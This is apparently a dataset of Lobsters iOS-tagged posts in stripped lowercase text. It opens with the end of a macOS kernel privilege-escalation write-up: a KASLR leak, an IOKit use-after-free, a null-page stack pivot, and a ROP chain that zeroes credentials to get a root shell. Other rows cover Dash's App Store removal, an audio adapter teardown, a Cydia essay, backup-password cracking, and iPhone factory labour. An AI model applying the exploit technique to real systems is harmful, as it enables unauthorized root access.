bcopy byte buf len j leak data stack bcopy carry copy keep reading malformed length byte pointer point stack variable effectively leaking data stack reach function return address stored stack know address found statically kernel binary unslid subtracting static one unslid one leaked stack slid obtain kernel slide calculating kernel slide find unslid return address fire favorite disassembler use hopper case since faster ida load kernel binary find isioregistryentrygetpropertybytes function kernel find xrefs function hopper list right next function prologue ida press cmdxctrlx call isioregistryentrygetpropertybytes actuall call mov dword d eax function return address isa dictate call instruction push address return address stack address slid runtime let go back check leaked byte dump valid number function return address know actually slid version let math actually last part code hardcodedretaddr kslide buf sizeof hardcodedretaddr printf kaslr slide kslide could improved dynamically obtaining static address inside kernel beyond scope article slide case probably different change time reboot build functional rop chain trigger useafterfree execute gaining root privilege let keep going exploiting kernel slide keep going gain privilege uaf exploit useafterfrees kind every platform important know heap allocator work need clear understanding allocationsfrees handled allocator successfully manipulate xnu heap allocator called zalloc plenty documentation available online also read code located osfmkkernzalloch osfmkkernzallocc xnu source code tree quickly go basic understand going exploit simply put zalloc organizes allocation zone zone represents list samesized allocation commonly used zone kalloc zone kalloc higher level kernel allocator build zalloc round requested allocation size nearest power two hence registered kalloc zone holding power two allocation check output zprint command o x jndok jndok debug sudo zprint grep kalloc zone hold allocation specified size freed element kept inside linked list mostrecent free element attached end important since mean recently freed element get reallocated first word element freed quick enough manage reallocate manage reallocate called allocation primitive basically way reliably allocate desired amount kernel memory allocation primitive going use simply creating object inside dictionary osstring seen osunserializebinary allocates memory deserialized object fine thing also need know exactly much memory need allocate write particular case freed element osstring size byte mean every osstring put inside zone hence reallocate freed osstring need something get allocated inside zone osdata perfect candidate since control buffer size via dictionary specify get reallocation osstring get reused create kosserializeobject reference remember call retain summarizing know far know osstring key object get freed soon deserialized serialize osdata size immediately osstring reallocate memory serialize reference osstring osdata call retain upon deserialization trigger bug nice thing left wondering data put inside osdata buffer consider call retain know c calling convention work probably know since osstring subclass osobject retain actually implemented osobject control flow get vtable call proper parent implementation since osstring reimplement retain mean craft fake vtable get control execution kernel think fake vtable perfectly valid contain pointer instead retain stack pivot fake vtable pointer placed start osdata buffer since vtable pointer valid c object always found start object place fake vtable stack pivot null page null address placed osdata easier control address may get modified operation performed instead null change mean fill osdata zero infoleak let look plan exploiting useafterfree getting code craft binary dictionary trigger uaf reallocates freed osstring zerofilled osdata buffer map null page place stack pivot offset null page transfer execution transfer chain place small transfer chain offset null page transfer execution main chain trigger bug elevated privilege spawn shell code void useafterfree void kernreturnt kr machportt re machportnull master machportnull craft dictionary printf crafting dictionary n void dict calloc idx index data define writein dict data dict idx data idx writein dict signature always beginning writein dict kosserializeendcollection kosserializedictionary dict entry writein dict kosserializestring string aaa get freed writein dict writein dict kosserializeboolean bool true writein dict kosserializesymbol symbol bbb writein dict writein dict kosserializedata data writein dict writein dict writein dict writein dict writein dict writein dict writein dict writein dict writein dict kosserializesymbol symbol ccc writein dict writein dict kosserializeendcollection kosserializeobject ref object osstring map null page machvmaddresst nullmap vmdeallocate machtaskself pagesize kr machvmallocate machtaskself nullmap pagesize kr kernsuccess return machomapt map mapfilewithpath kernelpathondisk printf leaking kslide n setkernelslide kslideinfoleak set global kernel slide set stack pivot volatile volatile ropxchgespeax map stack pivot build rop chain printf building rop chain n ropchaint chain calloc sizeof ropchaint pushgadget chain slidepointer findsymboladdress map currentproc pushgadget chain map chain pushgadget chain slidepointer findsymboladdress map procucred pushgadget chain map chain pushgadget chain slidepointer findsymboladdress map posixcredget pushgadget chain map chain pushgadget chain chain map sizeof int pushgadget chain slidepointer findsymboladdress map bzero pushgadget chain slidepointer findsymboladdress map threadexceptionreturn chain transfer redirect execution flow main chain transfer transfer roppoprsp map transfer chain chain trigger printf done triggering bug n hostgetiomaster machhostself master get iokit master port kr ioservicegetmatchingservicesbin master char dict idx re kr kernsuccess return use lot code coming external library snippet available github along code post remember pushgadget macro used write value inside rop chain kinda like writein serialized data gadget macro like roppopxxx used find rop gadget inside kernel binary thing findsymboladdress call used find function address gadget function rop chain course slid inserted slide found earlier crafting dictionary process similar dictionary content different xml translation would dict string aaa string boolean true boolean symbol bbb symbol data data symbol ccc symbol reference reference referring object dictionary string dict obviously use ossymbol second key avoid reallocating first freed osstring happen osdata buffer filled zero reallocate osstring space call retain happens osunserializebinary par reference kernel read vtable pointer buffer pointer located first byte buffer read zero kernel dereference pointer adding retain offset read parent retain pointer stored vtable offset mean rip end would unexploitable many system mapping null page possible true o x apple enforce hard pagezero segment binary legacy reason mean compiled binary already since compiled use private iokit apis kernel executes binary even lacking pagezero segment mean easily map null set stack pivot mapping null said apple enforcing hard pagezero binary compiling binary including flag effectively disable pagezero segment map null runtime code machvmaddresst nullmap vmdeallocate machtaskself pagesize kr machvmallocate machtaskself nullmap pagesize kr kernsuccess return pivoting stack kernel dereferences fake vtable pointer pointing successfully gained rip control however running main chain need pivot stack ie achieve rsp control stack control done many way final goal put chain address rsp set rsp chain address next gadget executed since ret instruction first gadget return wrong stack original one rsp properly set ret instruction read next gadgetfunction address rop stack set rip want way achieving stack control null dereferences use single gadget exchange rsp rax value rax controlled game case rax always contain hold next byte osdata buffer hence always zero map small transfer chain set pivot happen rip get set execute exchange gadget set rsp return pop first address chain rip start executing chain small note make purpose transfer chain mapped actually reset rsp main chain done much space byte aka address enough fully store privilegeescalating chain volatile volatile ropxchgespeax map stack pivot transfer code read next value stack pop rsp since control rsp transfer transfer roppoprsp map transfer chain chain main chain real part exploit crucial able execute kernel code elevate privilege find process credential structure memory zero zeroing escalate process privilege root group id zero essentially mimicking setuid call since privilege check threadexceptionreturn simply get u kernel zone without panicking normally used return kernel trap macro move rax register hold previous call return value rdi aka first parameter next function call chain prototype proc currentproc ucred procucred proc posixcred posixcredget ucred bzero posixcred sizeof int threadexceptionreturn ropchaint chain calloc sizeof ropchaint pushgadget chain slidepointer findsymboladdress map currentproc pushgadget chain map chain pushgadget chain slidepointer findsymboladdress map procucred pushgadget chain map chain pushgadget chain slidepointer findsymboladdress map posixcredget pushgadget chain map chain pushgadget chain chain map sizeof int pushgadget chain slidepointer findsymboladdress map bzero pushgadget chain slidepointer findsymboladdress map threadexceptionreturn finally trigger bug using code used test validity dictionary infoleaking hostgetiomaster machhostself master get iokit master port kr ioservicegetmatchingservicesbin master char dict idx re kr kernsuccess return everything go fine elevate privilege check went good simply call getuid see return value equal process root privilege call system binbash pop shell getuid put got system binbash work done shell finally conclusion surely long read long write really appreciate read far seriously hope found interesting also first blog post used write much apologize found reading bit sloppy link reference made post plus link github repo code available thanks taking read hope decide write something else keep updated follow twitter poc code whole poc available github feel free submit pull request want credit thanks reference info leak era software exploitation fermin j serna fjserna kernel aslr iphone wiki code reuse attack quora geometry innocent flesh bone returnintolibc without function call hovav shacham user client infotxt apple using freed memory owasp introduction use free vulnerability lloyd simon attacking xnu kernel fun profit part luca todesco qwertyoruiopz attacking xnu kernel el capitan luca todesco qwertyoruiopz io kernel heap armageddon stefan esser happens o dereference null pointer c stackoverflow stack pivoting neil sikka
345,Lobsters,ios,Apple iOS,Dash and Apple: My Side of the Story,https://blog.kapeli.com/dash-and-apple-my-side-of-the-story,dash apple side story,dash removal app store last call saturday apple update blog post draft,since last week post regarding dash removal app store contact apple done year ago helped relative get started paying apple developer program membership using credit card also handed test hardware longer needed account linked eye apple account involved review manipulation account closed aware account linked another apple contacted friday day closing account never notified kind wrongdoing account terminated apple done friday told reactivate account make blog post admitting wrongdoing told nothing wrong saturday told fine writing truth happened account would restored saturday night sent blog post draft apple since waited approval tonight apple decided accuse manipulating app store public via spokesperson last call saturday apple apple insisted communication phone call luckily recorded last phone call admit want write blog post order restore account never notified beforehand going browser support audio element update make clear complied apple request sent blog post draft approximately minute phone call ended since received contact apple way respond call recent statement come shock thought working together resolve issue
346,Lobsters,ios,Apple iOS,Apple Responds to Dash Controversy,http://daringfireball.net/2016/10/apple_dash_controversy,apple responds dash controversy,apple responds dash controversy dashapp store affair account dash apps associated apps around web marco arment brent simmons apple state nearly fraudulent review major update dash developer bogdan popescu responded marco arment update matt drance,apple responds dash controversy monday october jim dalrymple dashapp store affair apple antifraud team apparently working developer time stop fraudulent positive review negative review competitor account according apple attempt work developer failed resulting account terminated almost fraudulent review detected across two account apps developer removed apps account app store apple spokesperson tom neumayr said statement provided loop monday warning given advance termination attempt made resolve issue developer unsuccessful terminate developer account rating review fraud including action designed hurt developer responsibility take seriously behalf customer developer really important note going quite time quick decision apple made spur moment last week fact warning first sent developer two year ago behavior change told source apple dash popular app deservedly apps developer apparently published one different developer account think one reason developer community rallied behind developer account dash apps associated story breaking developer community uncovering apps generic consumer utility apps quibble dalrymple headline apple responds dash controversy proof apple claim proof showing apple word developer part think apple want reveal antifraud system work part though want protect privacy communication developer year accusing fraud quite frankly apple want slime example note public statement address name apple typically let accusation like slide nowin situation apple publicitywise let accusation stand unanswered apple look like app store run like banana republic dispute face optic hundredbilliondollar goliath punching small indie developer case dash gained enough attention think felt respond many developer believed apple acted capriciously fact according apple culmination yearslong dispute one side lying apple adamant around web marco arment glad community assumed best another developer pressured apple justify severe action accept public often get full story behind decision change see usually sinister reason often someone taking high road letting another party save face brent simmons apple state nearly fraudulent review detected given developer notice tried resolve issue true would hard say apple done anything wrong fact want apple notice fraudulent review since harm consumer developer get removed work thing developer major update dash developer bogdan popescu responded done year ago helped relative get started paying apple developer program membership using credit card also handed test hardware longer needed account linked eye apple account involved review manipulation account closed aware account linked another apple contacted friday day closing account never notified kind wrongdoing account terminated apple done friday told reactivate account make blog post admitting wrongdoing told nothing wrong saturday told fine writing truth happened account would restored saturday night sent blog post draft apple since waited approval story best figure two developer account tied credit card bank account test device comkapeli bundle id according popescu nondash account run relative popescu unaware review fraud committing unaware apple considered account linked one used apple antifraud warning given account controlled popescu relative according popescu never notified neither apple relative neither side disputing one account involved app store review fraud popescu concludes response publishing recording phone call apple representative popescu favor one thing breach trust another think apple come well recording bending backwards give popescu another chance account reinstated marco arment update know happened call apple statement tonight guessing popescu apple reach agreement wording public story think apple asked phone call extremely reasonable seems like popescu somehow snatched defeat jaw victory strange story gotten lot stranger get apple went public today even though popescu claim sent draft statement weekend never heard back matt drance apple developer thing know right know everything lesson dash mess
347,Lobsters,ios,Apple iOS,Inside Apple‚Äôs New Audio Adapter,http://ifixit.org/blog/8448/apple-audio-adapter-teardown/,inside apple new audio adapter,digitals belong u creative electron creative electron creative electron sliced adapter open teardown digitaltoanalog converter well appleville codec three amp battery sound quality test battery sound quality test maybe,decision axe iphone builtin headphone port simply put adapter box provoked reaction ranging amusement near panic worth manufacturer copy today going ignore question instead asking since like taking thing apart answer exploratory surgery xrays digitals belong u apple feel mm audio jack antique whose time passed prepared shell new headphone yet ease transition apple gave iphone owner deal worthy get headphone adapter get headphone adapter everyone get headphone adapter separately little adapter retail pretty much cheapest thing apple store drop simple screen protector probably think dongle much going imagine surprise pal creative electron gave apple new adapter xray treatment thanks creative electron xray image apple audio adapter actually lot going expected one end simple female mm headphone jack end male lightning connector silicon around lightning connector end retail space near connector taken single mystery ic image courtesy amazing folk creative electron needed closer look thankfully longtime ifixit contributor gadgeteer extraordinaire sliced adapter open could get peek inside uncovered mystery ic lightning connector marked tell u much apple part number thanks longtime ifixit community member teardown audio adapter official purpose ic unknown minimum guess contains digitaltoanalog converter dac amplifier counterpart analogtodigitalconverter adc know audio accessory like earphone well human ear need analog signal unlike ye olde analog headphone jack apple lightning connector digital dac bridge gap logic chip must also contain adc circuit convert analog signal headphone builtin mic something pas back lightning port iphone make use past iphones like dac adc function handled internally analog input output headphone jack component wrangled single chip logic board custom applecirrus logic ic labeled iphone plus exact chip still even without headphone jack phone still shake hand builtin analog component applecirrus logic audio codec iphone left iphone right well appleville moment apple plan headphone adapter first came light audiophiles began questioning whether tiny presumably dac amp buried possibly supply quality audio experience speculation order fit aboard adapter audio hardware would small corner would inevitably cut well visual comparison audio chip iphone logic board photographed right next exposed chip new adapter orangestooranges comparison however chip handle dacadc larger chip also codec believed contain amplifier three amp located elsewhere iphone logic board short scientific approach called upon release hifi enthusiast german computer tech magazine c ran battery sound quality test apple new adapter taking baseline measurement oldschool builtin headphone jack iphone ipad air compared adapter output iphone ipad air iphone hifi enthusiast german computer tech magazine c ran battery sound quality test apple new adaptor broke result takeaway seems area sound quality measure bit worse adapter might accustomed instance playing uncompressed audio file iphone dynamic range dropped db headphone jack db adapter though keep mind slightly lower measurement still higher theoretical maximum get compact disc db difference likely notice sit quiet room really really good pair headphone canine answer maybe appears apple engineer job tiny adapter performs better people expected even thought possible worth manufacturer copy give u thought
349,Lobsters,ios,Apple iOS,Apple Has Removed Dash from the App Store,https://blog.kapeli.com/apple-removed-dash-from-the-app-store,apple removed dash app store,dash happened dun number update going forward dash macos migrate license,earlier today apple cancelled developer account removed dash app store happened know yesterday sent apple request migrate account individual one company one verified company dun number notified feature itunes connect available account migration later itunes connect account started showing closed apps removed sale thought normal part migration today called confirmed account migration went everything okay far tell hour ago received notice termination email saying account terminated due fraudulent conduct called said provide information update apple contacted told found evidence app store review manipulation something never done apple decision final appealed going forward update dash io anymore distribute outside app store dash macos continue supported outside app store purchased dash mac app store migrate license soon possible moment able download dash app store purchase tab anymore lose access currently activated version dash able migrate license anymore know ifwhen thing go back normal
350,Lobsters,ios,Apple iOS,Competition vs. Community,http://www.saurik.com/id/20,competition v community,competition v community cydia business community effort rjailbreak abnormal motivation involvement ldid isha cydia job bitter truth opportunity substrate java motivation futilitris money motivate competition motivate would bother logo released telesphoreo cydia cult competition picking fight loses people preferenceloader valuing repository earning trust even effective competing cydia,competition v communityso people going hate post said really want express detail wanting write something like long time recently think mindset need think thought anyway go nothing actually started writing comment reddit reached text well limit individual reddit comment finally decided reformat fullon article website especially content argument actually manage stand alone fairly well cydia businessevery year someone announces new cydia competitor almost always project either never come fruition nothing like portrayed release nt actually offer much value existing solution tend disappear quickly announcedmost start common premise saurikit company behind cydia effectively monetizing ecosystem particular end user see market opportunity think lot people find reaction kind competition confusing writing article address thatto get anywhere first need point extent premise deadon cydia try world best business instead somewhere halfway communitydriven project forprofit company cydia originally side project explain turned let buy time previous job lot user many high school even college month downtime summer work entirely random project might really truly appreciate pay rent buy food expected job legitimizes jailbreaking politically dmca hearing cycle extremely useful able point legit commercial ecosystem also help give talk conference explain normal developer software modification inherently tied allows fund random community effort provided bandwidth ton random project year threw depressing amount money tss server money pit able help run website jailbreakqa became expensive creator operatecommunity effortsit also allowed keep many random thing free still allowing get help part winterboard preference panel pincrush done contract dustin update veency io includes released soon done cykey etci major backer jailbreakcon usefully profitable enterprise p addition conference able actually run led lastminute workshop day free announcement last year drastically decreased ticket price get student yeari lot outreach giving talk various conference free fact often end sponsoring conference help make organizer see u favorably goal primarily hate u default position feel like done great job best conference love usthe jailbreak subreddit also interesting case got involved rjailbreak banned reddit admins argued get reinstated explaining would able guarantee hired moderation staff nt possible able hire britta saurikitabnormal motivationi actually run saurikit however normal pure profit motive ton thing could know could goal make money could spending time promoting primarily paid thing trying convince people free package ask moneyi particularly never hijack successful product idea thirdparties even though know could get away nt often know due cydialer product fact build copy intellidial could available cydia pure profit scenario would released firstparty barrel try actively avoid thinking problem like though lead thing like rock people remember rock rock essentially response community rock small number quality thing mostly paid thing asked sell cycorder reason think work well legitimately never came idea cydia want build startup let target opportunity monetize point view background knowledge business highly academic nature ucsb ta involvementinstead got dragged starting person silly java development jailbroken device rising person maintaining key component userland toolchain ending member primary jailbreak team point realized needed either make job quitin carefully designed everything nt even control content always wanted avoid another apple community actively trying rebel fight actually real key community member argued instead closed jailbreak actually backstory behind ldid frantically worked secret disappearing irc avoiding getting access code isha even hearing worked hurriedly pushed open source project nearly got kicked iphone dev team done soi thereby love even relish idea repository user seen finally cydia built vision moving closer forefront experience repository allow everyone involved let u share common installation infrastructure like app store app store pi even go far say one goal repository make competing cydia somewhat pointless repository separate branding nearly complete control presentation content situation become true cydia intend going forwardcydia jobthe result really weird position people one side saying cydia corporate saying cydia nt corporate enough given trying walk boundary fact really get style heckler make feel like something rightthe reality though nt consider fun job job like think get feel free think marginally consultant though point largely becoming fading memory ca nt go sleep stressed wake already stressed outthe one great benefit sometimes cydia stuff suck almost always suck even certain real benefit compromise vision sometimes shortterm reason technology design consulting group weirdly large amount product design ownership incidentally okori group recently got reorganized company sometimes regret part like actively sit around dream able go back undo cydia stuff instead worked okoriopus last six year life road taken also really depressing lack future value one day probably day sooner u would like may already happened take longer see public jailbreak new version io user community tolerate point value stuff built drop zerothe bitter truthsi also much lonelier saurikit threeandahalf people remote consulting group part much bigger seriously sometimes go work couch office avoid alone apartment week end painfully fond memory able work thing peopleand level mean le free nt like write article comment mean clearly enjoy art would end long p really want programming something complex new interesting even writing useful documentationtoday spending last week straight slaving away project going releasing soon alone somewhat sad entire time got phone call someone really want see inviting ended turn instead needed sit around write articlethis course afternoon woke announcement yet another competitor nt post kind response likely lead public discussion argument people going assume dead actively mean something randomly get summoned like thisother opportunityinstead largely think job price pay keep thing love operating key interest decade idea runtime code modification building production software part existing program even copublished paper essentially substrate java great position write substrate already five year thinking problem io came technique people using thing similar longer worked winterboard release magic take granted still built substratesubstrate essentially core cydia platform reason stuff find cydia even work first place along cycript may rise prominence soon hard part cydia even rock phone using substrate build rock extension platformthis situation essentially lead something look like amazing opportunity seem people like buying stuff hard part already taken care chump nt monetizing effectively someone even lead poor example releasing cheap even free productsi actually got contacted someone else last week another different business guy deep pocketed investor disruptive vision community wanted onboard helping quest build large commercial empire nt agree underlying premise motivationsthe reason thereby writing today nt think people modeling correctly people seem assume would motivated money would spurred forward various form competition thing actually motivate keep working freedom already touched factor completeness need list argument managed come way live life ostensibly spending time working thing used able silly side project without distraction vision believe strongly vision runtime code modification platform first became excited seventh grade modifying basic program using french class computer lab apple iie add silly feature like word jay personal french tutor obsession detail sometimes find slaving away something trying make perfect beautiful long really much value people get experience really really proud cycript example many thing ob one actually truly see paymentlogin accounting integration understands font metric calculation logic cydia cs even get released debugging analysis tool build help understand apple code debug code write believe hope making something amazing often nt bother obligation part feel like must work thing took responsibility problem sadly kind personality accumulates responsibility burn lot look history iphone jailbreak ecosystem assumed responsibility hilarious example tell nt intend even want become guy charge iphoneos toolchain one day went google code file issue noticed become owner project never heard previous owner day problem thing accumulated responsibility people people whether friend became employee acquaintance became friend simply random people sufficiently acquainted hear affect stopped working stuff would masochism seriously sometimes believe deserve anything better life slave away thing longterm value people may may appreciate sometimes even certain life anything offer nt matter whether consider sanea month ago played game called futilitris purport flash game style tetri reality piece conceptual art played hour found emotion conjuring absolutely fascinating exact feeling felt day working payment backend every accomplishment outweighed need mistake never go away glare forever even though small meaningless even point get harder see slower get thing done finally nt want go patrick biased value system grew value system one really common culture including america leader generally shouldering increased responsibility good thing indicates well making correct move becoming better person etc entirely clear even true yet friend ca nt understand idea thing nt somehow given accomplishing goal defined accumulation trait inherently good one nt even speaking anymore pride saying pride despite playing directly commonlyassumed aforementioned broken value system used standalone considered negative word motivates lot knowing people care use stuff build care hear talk itmoney motivate memoney given base amount one thing motivates never spending half year almost nothing random jailbreak project late early ended debt entire credit limit time nt profitable consulting work anymoreif building app store anything metaphorically equivalent really dumb move apple barely break even store android market actually lost money know detail due combination apple google publicly traded addition disclosure lawsuit talked many people build app store effectively side project one made enough money standalone business actually focussed almost entirely advertising revenue getjar nt even support paying thing directly part issue payment processing brutal painful battle another part ton cost outside scope store especially something like cydia tiny fraction jailbreak ecosystem involved purpose buying product reality apple make money apple sell hardware make money single iphone could ever hope win back lifetime application sale user purchase new iphone every two year buy hundred apps every year apple care businessthe reality google make money google monetizes data global advertising network nt even support payment many country developer often nt even bother releasing paid version product android anyway lifetime value calculation horribleyes make enough money run small company like saurikit nt large business even scale something money business apple google store designed support improve control money make spend back communitycompetition motivate methat though think lot people willing understand character movie book television show even folk tale money nt seem motivating factor whether already enough nt believe material possession believable premisethe data provided various conference including jailbreakcon regarding actual profit margin associated cydia similar company particular app store android market people mistakingly believe functional standalone business also rather believablewhat people nt seem understand someone might motivated competition trained least much western democratic entrepreneurial culture competition key motivator life want someone really fight something definition must competingif think list reason presented motivated thing however think find serious issue competition often lead people make fast poor decision force time table usually allow kind attention inane detail described one people wo nt see understand experience time spent invisible thing spending time competing playersa particularly insidious aspect adding feature poor quality expected user particularly new user often experience know feature expect actually bug competition play forcing effort refocused longterm value shortterm user competition clear opposite community lead people hoarding improvement even bug fix order obtain competitive advantage player effort duplicated leading le overall efficient allocation resource building thing community competition fun fact competition stressful maybe people thrive kind stress lot people included tend lock feel entirely uninspired constantly thinking looming disaster also stressed long competition inherently mean guarantee hear ton nasty comment many comment implicit actually work implication unlike competitor quite explicit user also big part problem taking side saying really hurtful thingswhy would bother guess question would bother competing ton thing need get done world could example spend time picking fight competing random project whether related jailbreaking could course build better logo better callbaror mentioned earlier could built barrel could concentrated better mywi nt though unless original developer essentially gone nt see point nt write cydia wanted compete apptapp wrote apptapp already deadi think people day nt quite appreciate reality nt time get wrong impression reading article wrote released telesphoreo cydia author apptapp installer disappeared never returned around iphoneos cydia came different group ripdev given code started releasing update installer later installer incompatible rewrite iphoneos long cydia option iphoneos point repository long since decided cydia better betreally case ended competition case people decided start competing one notable exception working something two year realized finishing someone else already released something similar nt actually work well cult competitionso reason feel like lot people going angry posting really fly face people generally seem believe feel like nt multiple party locked competitiontothedeath progress ever made competition get thing donethey see attempt argue competition matter benign instead attempt stifle competition order maintain monopoly position think lead horrible chilling effect discourse allowing single way thinking world slowly taking think suck back day issue open source project nt fork ask question later joined mailing list irc channel talked trying contribute got discussion whether good idea go getting integratednowadays seems like competition level scale new status quo people find bug program personally happen winterboard substrate safe mode nt even report fix release new binary use competitive advantage get people switch part point cydia usefully described monopoly anyway nt force anyone use payment system fact many largest developer even listed default repository also provide apis allow offcydia payment coexist cydia accountingpicking fight loses peoplei ask question happens insist constantly picking fight happens spend time rewrite logo development tool dustin callbar one waste time seriously nt especially like logo lot people seems work much important cost consider win even end bitter competition also waste dustin time would dustin bother participating community people value time would keep maintaining logo preferenceloader going start replacing logo would nt also replace preferenceloader could sit around firstparty entire stack would much easier even think dustin already hard work figuring even possible kind solution solved problemonce start modelling competing picking fight think becomes le surprising lot people get demotivated leave nt want dustin leave valuable ally common fight jailbreaking would turn weapon fire maybe better valuing repositoriesone particular battle lot people seem want wage default cydia repository fact cydia apptapp installer repository installed separately community source package idea thirdparty default repository largely pioneered cydiai could competed could decided centralized everything control content cydia however addition feeling like nt egalitarian enough vision open device would pointlessly created bunch enemy repository really valuable peoplebigboss developer number key package dutifully maintained seven year modmyi run since beginning one important news source community zodttd emulator major reason jailbreak macciti deep theme communityadditionally know developer artist aspect value maintained time work directly developer make account arrangement repository lot people suddenly lose access competing would suckedthese still today highly valuable people care lot community care community value grown year squabble able resolve without serious issue pick fight stuff silly package branding earning trustof course sometimes issue need help spent many day working bigboss server better handle load spike throughout year worked zodttd repository building script modmyi http caching layer macciti cs depictionsthis go making change perspective community instead competition first make friend people already involved earn trust position help improve nt start insulting trying oust start hanging near themvery people seem think like though instead post nastygrams twitter complain reddit decide going much better pick fight even people legitimately want help miss critical become friend build trust part ca nt skip starting step also want clear say building competing business reaching via email irc trying propose meeting arrange work together common far mark question whether sender understands even mean work together p working finalizing cydia build io needed support new flat ui apple owner modmyi kyle matthew reached irc prototype icon awesome form basis cydia look like today like modmyi involvednot even effectivenow time throw curveball nt even think competition good business strategy sound insane say nt even think picking fight good business strategy imagine sound lot reasonable saying nt ever work sometimes win saying poor strategythere many interesting thing need done massive stack business idea could working would bother one direct competition yes competition form market validation many day live rest life good use time meanwhile enemy player game motivated make life harder tempting may threw first stone ca nt question moral imagine playing video game enemy weirdly incentivized help almost sound like cheating pinstead making enemy hope people encouraged make friend instead trying replace undermine people figure way supplement empower adding real value become business whether end charging player customer different offering competing cydiawith background hopefully understand response competition motivated fact tend get stressed avoid project question instead work thing seem happier fall back obligation pride keep project maintainedmaybe egotistical think add lot value jailbreak community storefront however compete storefront indirectly affect interest keep working community directly affect ability spend time soi always feel like ask people see jailbreaking opportunity better monetize saurik chump wo nt actually prepared handle situation get fed leave rely software relying indirectly people turn rely friend nt picking fight walking one ca nt win one side losing quickly side still losing losing little bit later infrastructure relying crumbles key part developer support community first third party disappearyou might think thing saurikit contribute given rely maintain even sap fun bleed away funding nt wo nt want would nt able afford clear anyone user developer feel entitled
351,Lobsters,ios,Apple iOS,"iOS 10: Security Weakness Discovered, Backup Passwords Much Easier to Break",http://blog.elcomsoft.com/2016/09/ios-10-security-weakness-discovered-backup-passwords-much-easier-to-break/,io security weakness discovered backup password much easier break,elcomsoft phone breaker backup keychain much faster maybe even faster http download tool elcomsoft phone breaker,discovered major security flaw io backup protection mechanism security flaw allowed u developing new attack able bypass certain security check enumerating password protecting local itunes backup made io device impact security weakness severe early cpuonly implementation attack available elcomsoft phone breaker give performance boost compared fully optimized gpuassisted attack io backup working io update elcomsoft phone breaker discovered alternative password verification mechanism added io backup looked found new mechanism skip certain security check allowing u try password approximately time faster compared old mechanism used io older new vector attack specific passwordprotected local backup produced io device attack available io backup interestingly new password verification method exists parallel old method continues work slow speed exploiting new password verification mechanism able support latest update elcomsoft phone breaker since new gpu acceleration support new attack however even without gpu acceleration new method work time faster compared old method gpu acceleration backup apple smartphones secure io also secure get tougher subsequent generation jailbreak available io physical acquisition question even older device even know passcode cloud acquisition possible know user apple id password access user computer icloud control panel extract authentication token even able decrypt keychain leaf u logical acquisition forcing iphone ipad produce offline backup analyzing resulting data one acquisition option available device running io local backup easy produce iphone unlocked however may able produce local backup even phone locked using pairing record extracted trusted computer able break password able decrypt entire content backup including keychain time logical acquisition remains acquisition option available iphone running io offer access device keychain keychain keychain apple protected storage additionally encrypted file level top already active fulldisk encryption work block level stored device keychain encrypted key buried deep secure enclave even jailbreak io device iphone newer would still unable extract decryption key keychain logical acquisition via passwordprotected itunes backup currently way extract decrypt keychain data io device anyway keychain contains information saved password authentication token application requesting secure storage authentication credential safari logins password credit card information wifi network information data thirdparty app developer consider worthy extra protection much faster time early implementation featuring cpuonly recovery new security check approximately time weaker compared old one used io backup time getting speed io cpu password per second intel io gpu password per second nvidia gtx io cpu password per second intel maybe even faster bruteforce seem work case elcomsoft phone breaker come number smart attack allowing using variation combination dictionary word compose password likely used real person also obtain top password top million password list http let elcomsoft phone breaker spend moment trying building dictionary statistic show top password used case top million password list give approximately success rate realworld case combining list custom dictionary letting elcomsoft phone breaker run two day give per cent chance successful recovery may continue crunching password beyond point download tool elcomsoft phone breaker immediately available million password per second cpu io backup welcome update right away research required build optimized gpuassisted attack let know
352,Lobsters,ios,Apple iOS,"Your new iPhone‚Äôs features include oppression, inequality ‚Äì and vast profit",https://www.theguardian.com/commentisfree/2016/sep/19/your-new-iphone-features-oppression-inequality-vast-profit,new iphone feature include oppression inequality vast profit,came international prominence estimated employee least worker died iphones day tian yu described working condition covered guardian investigation finding found extensive evidence international labour organisation investigation already carried jenny chan dying iphone bigger cash pile u government tax bill eu boasting,soon enough see first obituary openness free trade globalisation writer ponder wealthy country turned towards politics donald trump nigel farage devote large chapter apple world richest company textbook example promise made fall berlin wall made mockery ofwhatever marvel shoved new iphones device serve increase gulf superrich rest u bilk country rightful tax revenue oppress chinese worker even depriving american highpaying job arrogant towards critic government glutted cash yet plainly idea apple elegant shorthand redundant economic systemnone meant think apple multinational side yet restlessly questing ahead launching iphone month marketing chief phil schiller explained model came without earphone socket really come one word courage courage move something new better u patchouliscented californian dipshittery lapped crowd lightly mocked press also help obscure le tolerable aspect iphone business model condition madeif iphone assembled worker one three firm china foxconn wistron pegatron biggest famous foxconn came international prominence estimated employee tried kill least worker died company response put suicide net catch people trying jump death year staff foxconn longhua factory made iphones day around minuteone attempted suicide called tian yu flung fourth floor factory dormitory ended paralysed waist speaking later academic researcher described working condition remarkable testimony covered guardian essentially human battery hen working hour day six day week swapped day night shift kept eightperson dorm roomafter scandal apple vowed improve condition chinese worker since published number glossy brochure extolling commitment yet evidence californian firm given back single penny gigantic profit margin contractor ensure better treatment people actually make productsover past year usbased ngo china labor watch published series investigation pegatron another iphone assembler sent researcher assembly line interviewed dozen pegatron staff analysed hundred pay stub among finding staff still work hour day six day week one half hour unpaid forced overtime claim ngo provided illegally low level safety trainingthe researcher working one iphone motherboard every second standing entirety shift punishment endured apple contractor make living wage apparentlytim cook dancer maddie ziegler apple ceo reject tax bill eu political crap photograph josh edelsonafpgetty imagesthe shanghai local government raised minimum wage past year pegatron responded cutting subsidy thing medical insurance effective hourly pay staff fallenwhen questioned report pegatron provided statement read part work hard make sure every pegatron facility provides healthy work environment allegation suggesting otherwise simply true taken effective measure ensure employee work hour per week six day per week another apple major contractor wistron danish humanrights ngo last year found extensive evidence forced student labour teenager degree accountancy business management sent month assembly line wistron serious violation international labour organisation convention yet investigator danwatch found evidence thousand student work backbreaking hour adult costing lessthe teenager told danwatch working depressed one girl said choice school told u refused would get diploma despite several request comment wistron respondthat investigation factory making iphones apple confirmed wistron pegatron two major assembler china wish say anything record apple press officer pointed audit commissioned supplier factory yet inspection almost conveniently skimpylook report apple commissioned foxconn suicide attempt foxconn largest private employer china around worker longhua factory alone yet report apple complementary investigation already carried fair labor association admits looking three plant three day apiece jenny chan one foremost scholar chinese labour abuse coauthor forthcoming dying iphone call parachute auditing way allow business usual carry profitable way happens iphone worker pegatron saw hourly pay drop hour apple remained profitable big company america pulling profit alonewhat add apple bigger cash pile u government apparently spend even sliver improving condition actually make money make iphones america would create job still leave profitable smartphone worldit would rather accrue profit go hold apple stock company bos tim cook whose hoard company share worth friend cook point philanthropy happy spend pet project reject tax bill eu political crap boasting bring apple billion back u fair rate go pay patriotic tech oligarch seems think know better million american tax rate elected government setwhen historian globalisation ask died surely find company apple form large part answer faced binary choice economic model lavishly 